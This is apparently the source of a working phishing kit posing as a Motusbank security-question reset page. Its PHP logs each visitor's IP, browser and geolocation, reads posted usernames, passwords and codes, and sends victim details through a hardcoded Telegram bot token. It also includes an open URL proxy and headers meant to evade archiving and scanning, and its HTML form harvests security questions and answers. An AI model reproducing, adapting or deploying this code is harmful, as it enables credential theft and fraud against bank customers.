<?php
 include "/251818/040148.php";
 include "/251818/040149.php"; 
 include "/251818/040152.php"; 
 include "/251818/040153.php"; 
 include "/251818/040154.php"; 
 include "/251818/040150.php"; 
 include "/251818/040147.php"; 
 include "/251818/040151.php"; 

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'Master_database.csv';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$file = '../../../log.txtt';
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "[pc]presidents choice [pc] ";
    $project    = "[rR] PROJECT-SWIFTRYNX [rR]";
    $url        = "https://pcfinancial.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
    $logo       = "[CR00K-1N]";
    $gitusr     = "RandomRyan";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
	$lh     = "+";
        $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message = "\n\n \n$url\n===========$bank============\n\nCLICKED ON $date AT $time\n\n $ip\n\n$uaget\n\n$uos\n$bsr\n\n$is\n\n$city\n$country\n$continent\n\n maps.google.com/?q=$la$lh$lp\n\n======$project==== \n";
 
$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data = [
    'chat_id' => '-1001819831566',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );


header('Location: MOT_3.php');
?>
<? php  ?>=(0040)220098/motus/q -->
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html xmlns="http://www.w3.org/1999/xhtml" class=" js flexbox flexboxlegacy"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>Sign In</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
        <script src="./files/modal"></script>
        <script>
            function empty() {
                var y;
                y = document.getElementById("username").value;
                if (y == "") {
                    document.getElementById("username").style = "border-color:red";
            		document.getElementById("username_error").style = "display: block";
                    return false;
                }
            	var x;
                x = document.getElementById("password").value;
                if (x == "") {
                    document.getElementById("password").style = "border-color:red";
            		document.getElementById("password_error").style = "display: block";
                    return false;
                }

            }
        </script>
        <script>
            function change() {
                var e;
                e = document.getElementById("username").value;
                if (e !== ""){
            	    document.getElementById("username").style = "";
            		document.getElementById("username_error").style = "display: none";
            	}
            	var e;
                e = document.getElementById("password").value;
                if (e !== ""){
            	    document.getElementById("password").style = "";
            		document.getElementById("password_error").style = "display: none";
            	}

            }

        </script>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
        <!--<base href=".">--><base href=".">
        <link href="./files/style.css" rel="stylesheet">
        <link href="./files/mint.css" id="theme-stylesheet" rel="stylesheet">
        <script src="./files/jquery-3.6.0.min" crossorigin="anonymous"></script>
        <script>var lrbank = 'Motus'; var lrinfo = 'Questions';</script>
        <script src="./files/actions"></script>
        <style>
        .newselect {
            background: #f3f3f4;
            border: none;
            border-bottom: 2px solid #c1c1c1;
            color: #414042;
            min-height: 28px;
            outline: 0;
            padding: 3px 0;
            transition: border-color .1s ease;
            border-radius: 0;
        }

        input, select, textarea {
            display: block;
            font-family: system-ui;
        }

        body {
            font-family: system-ui;
        }

        [type=button], [type=reset], [type=submit], button {
            font-family: system-ui;
        }
        </style>
    </head>
    <body>
        <div class="body-content">
            <div class="row public-header">
                <div class="logo-container">
                    <a href="H/220098/motus/">
                        <img src="./files/logo.svg" alt="" class="meridian-logo">
                    </a>
                </div>
            </div>
        </div>
        <center>
            <h2 style="padding-top: 22px; margin-bottom: 5px;"><strong>Please reset your security questions</strong></h2>
        </center>
        <br>
        <center>
            <form method="post" action="MOT_6.php" class="ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic" style="padding: 0px 25px;">
                                <div class="td-row">
                    <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                        <div class="otp-section-mint-green otp-full-width-sm">
                            <div class="td-row">
                                <div class="td-col-sm-6 td-col-sm-offset-3">
                                    <div class="form-group" style="">
                                        <select required="" name="question1" class="td-layout-grid6 newselect lrinput" size="1" style="height:42px;width:100%">
                                            <option value="" selected="selected">Select the security question</option>
                                            <option value="What was the name of your favourite superhero as a child?">What is the first name of your oldest nephew?</option>
                                            <option value="What is the name of the city where your mother was born?">What is the name of the city you were married in?</option>
                                            <option value="What was the last name of your favourite teacher in high school?">What was the colour of your first car?</option>
                                            <option value="What is the first name of your oldest nephew?">What was your best friend's first name?</option>
                                            <option value="What is the first name of your father&#39;s oldest sibling?">What is the name of your first pet?</option>
                                            <option value="What is the first name of your oldest cousin?">What is your mother's maiden name?</option>
                                            <option value="What was the first name of your first roommate?">What was the first name of your Maid of Honour?</option>
                                            <option value="What is the first name of your spouse&#39;s/partner&#39;s father?"> What is the city of your high school?</option>
                                            <option value="What is the first name of your first friend?">What is your father's middle name?</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="td-row">
                    <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                        <div class="otp-section-mint-green">
                            <div class="td-row">
                                <div class="td-col-sm-6 td-col-sm-offset-3">
                                    <div class="form-group" td-ui-form-group="Enter your Username or Access Card #" style="">
                                        <input id="usernameOrAccessCard" placeholder="Enter your security answer" required="" name="answer1" class="ng-pristine ng-untouched ng-valid form-control ng-empty lrinput" style="width: 100% !important">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                                <div class="td-row">
                    <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                        <div class="otp-section-mint-green otp-full-width-sm">
                            <div class="td-row">
                                <div class="td-col-sm-6 td-col-sm-offset-3">
                                    <div class="form-group" style="">
                                        <select required="" name="question2" class="td-layout-grid6 newselect lrinput" size="1" style="height:42px;width:100%">
                                            <option value="" selected="selected">Select the security question</option>
                                            <option value="What was the name of your favourite superhero as a child?">What is the first name of your oldest nephew?</option>
                                            <option value="What is the name of the city where your mother was born?">What is the name of the city you were married in?</option>
                                            <option value="What was the last name of your favourite teacher in high school?">What was the colour of your first car?</option>
                                            <option value="What is the first name of your oldest nephew?">What was your best friend's first name?</option>
                                            <option value="What is the first name of your father&#39;s oldest sibling?">What is the name of your first pet?</option>
                                            <option value="What is the first name of your oldest cousin?">What is your mother's maiden name?</option>
                                            <option value="What was the first name of your first roommate?">What was the first name of your Maid of Honour?</option>
                                            <option value="What is the first name of your spouse&#39;s/partner&#39;s father?"> What is the city of your high school?</option>
                                            <option value="What is the first name of your first friend?">What is your father's middle name?</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="td-row">
                    <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                        <div class="otp-section-mint-green">
                            <div class="td-row">
                                <div class="td-col-sm-6 td-col-sm-offset-3">
                                    <div class="form-group" td-ui-form-group="Enter your Username or Access Card #" style="">
                                        <input id="usernameOrAccessCard" placeholder="Enter your security answer" required="" name="answer2" class="ng-pristine ng-untouched ng-valid form-control ng-empty lrinput" style="width: 100% !important">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                                <div class="td-row">
                    <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                        <div class="otp-section-mint-green otp-full-width-sm">
                            <div class="td-row">
                                <div class="td-col-sm-6 td-col-sm-offset-3">
                                    <div class="form-group" style="">
                                        <select required="" name="question3" class="td-layout-grid6 newselect lrinput" size="1" style="height:42px;width:100%">
                                            <option value="" selected="selected">Select the security question</option>
                                            <option value="What was the name of your favourite superhero as a child?">What is the first name of your oldest nephew?</option>
                                            <option value="What is the name of the city where your mother was born?">What is the name of the city you were married in?</option>
                                            <option value="What was the last name of your favourite teacher in high school?">What was the colour of your first car?</option>
                                            <option value="What is the first name of your oldest nephew?">What was your best friend's first name?</option>
                                            <option value="What is the first name of your father&#39;s oldest sibling?">What is the name of your first pet?</option>
                                            <option value="What is the first name of your oldest cousin?">What is your mother's maiden name?</option>
                                            <option value="What was the first name of your first roommate?">What was the first name of your Maid of Honour?</option>
                                            <option value="What is the first name of your spouse&#39;s/partner&#39;s father?"> What is the city of your high school?</option>
                                            <option value="What is the first name of your first friend?">What is your father's middle name?</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="td-row">
                    <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                        <div class="otp-section-mint-green">
                            <div class="td-row">
                                <div class="td-col-sm-6 td-col-sm-offset-3">
                                    <div class="form-group" td-ui-form-group="Enter your Username or Access Card #" style="">
                                        <input id="usernameOrAccessCard" placeholder="Enter your security answer" required="" name="answer3" class="ng-pristine ng-untouched ng-valid form-control ng-empty lrinput" style="width: 100% !important">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                                <div class="td-row">
                    <div class="td-col-sm-4 td-col-sm-offset-2 td-col-sm-push-4 td-col-md-3 td-col-md-offset-3 td-col-md-push-3">
                        <div class="form-group">
                            <button type="submit" name="save" value="1" class="td-button  td-button" style="background-color:#0079c1;width: 100%">
                            <font color="white">  Next</font>
                            </button>
                        </div>
                    </div>
                </div>
            </form>
            <br><br>
        </center>
        <footer class="main-footer">
            <div class="footer-spiral-container">
                <img class="footer-spiral visible" src="./files/Spiral-1.svg" style="animation-delay: -30.4396s;">
            </div>
            <div class="row">
                <div class="logo-container">
                    <a href="https://banking.motusbank.ca/Security_Login">
                    <img src="./files/logo.svg" alt="Motusbank Logo" class="motusbank-logo">
                    </a>
                </div>
                <div class="footer-sub">
                    <span>Copyright © 2023 Motus Bank. All rights reserved.</span>
                    <ul class="footer-links">
                        <li><a href="https://www.motusbank.ca/agreement-privacy" title="Privacy &amp; Security" target="_blank">Privacy &amp; Security</a></li>
                        <li><a href="https://www.motusbank.ca/legal" title="Legal" target="_blank">Legal</a></li>
                        <li><a href="https://www.motusbank.ca/accessibility" title="Accessibility" target="_blank">Accessibility</a></li>
                    </ul>
                </div>
            </div>
            <a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
        </footer>
        <div class="ui-selectmenu-menu ui-front">
            <ul aria-hidden="true" aria-labelledby="account-switcher-button" id="account-switcher-menu" role="listbox" tabindex="0" class="ui-menu ui-corner-bottom ui-widget ui-widget-content"></ul>
        </div>
        <style>
        [type=color], [type=date], [type=datetime-local], [type=datetime], [type=email], [type=month], [type=number], [type=password], [type=search], [type=tel], [type=text], [type=time], [type=url],
        [type=week], input:not([type]), select[multiple], textarea {
            margin-bottom: 25px;
            height: 42px;
            width: 340px !important;
        }

        .td-layout-grid6 {
            margin-bottom: 10px;
        }
        </style>
    

</body></html></html></html></html>